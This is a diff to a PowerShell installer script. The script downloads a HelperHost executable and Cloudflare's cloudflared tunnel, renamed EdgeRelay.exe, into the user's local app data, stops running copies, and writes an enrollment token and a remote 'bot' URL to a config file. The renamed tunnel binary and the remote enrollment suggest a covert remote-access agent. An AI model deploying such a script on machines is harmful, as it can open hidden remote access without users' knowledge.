@@ -3,12 +3,22 @@ if (-not $Enroll) { $Enroll = $env:AGENTSHE_ENROLL }
 if (-not $BotBase) { $BotBase = $env:AGENTSHE_BOT_BASE }
 if (-not $Enroll) { throw 'Enroll manquant' }
 if (-not $BotBase) { throw 'BotBase manquant' }
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $Gh = if ($env:AGENTSHE_GH) { $env:AGENTSHE_GH } else { 'https://github.com/lilygopro/AgentSHE/releases/download/v1.0.2' }
 $BotBase = $BotBase.TrimEnd('/')
 $Dir = Join-Path $env:LOCALAPPDATA 'HelperHost'
 $Cache = Join-Path $env:TEMP 'HelperHostCache'
 New-Item -ItemType Directory -Force -Path $Dir,$Cache | Out-Null
 Get-Process HelperHost,EdgeRelay -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+
+function Download-File([string]$Url, [string]$OutFile) {
+  if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
+    & curl.exe -fsSL $Url -o $OutFile
+    if ($LASTEXITCODE -ne 0) { throw "download failed: $Url" }
+    return
+  }
+  Invoke-WebRequest -UseBasicParsing -Uri $Url -OutFile $OutFile
+}
 
 function Restore-OrFetch([string]$Name, [string]$Url) {
   $dest = Join-Path $Dir $Name
@@ -17,13 +27,13 @@ function Restore-OrFetch([string]$Name, [string]$Url) {
   if (Test-Path $cached) { Copy-Item $cached $dest -Force; return }
   $part = Join-Path $Cache ($Name + '.download')
   Write-Host ("prep " + $Name + "…")
-  Invoke-WebRequest -UseBasicParsing -Uri $Url -OutFile $part
+  Download-File $Url $part
   Copy-Item $part $cached -Force
   Copy-Item $cached $dest -Force
 }
 
 Restore-OrFetch 'HelperHost.exe' "$Gh/HelperHost-windows-amd64.exe"
-Restore-OrFetch 'EdgeRelay.exe' 'https://github.com/cloudflare/cloudflared/releases/download/v1.0.2/cloudflared-windows-amd64.exe'
+Restore-OrFetch 'EdgeRelay.exe' 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe'
 
 @{ enroll = $Enroll; bot_base = $BotBase } | ConvertTo-Json | Set-Content -Encoding UTF8 (Join-Path $Dir 'config.json')
 $env:AGENTSHE_ENROLL = $Enroll
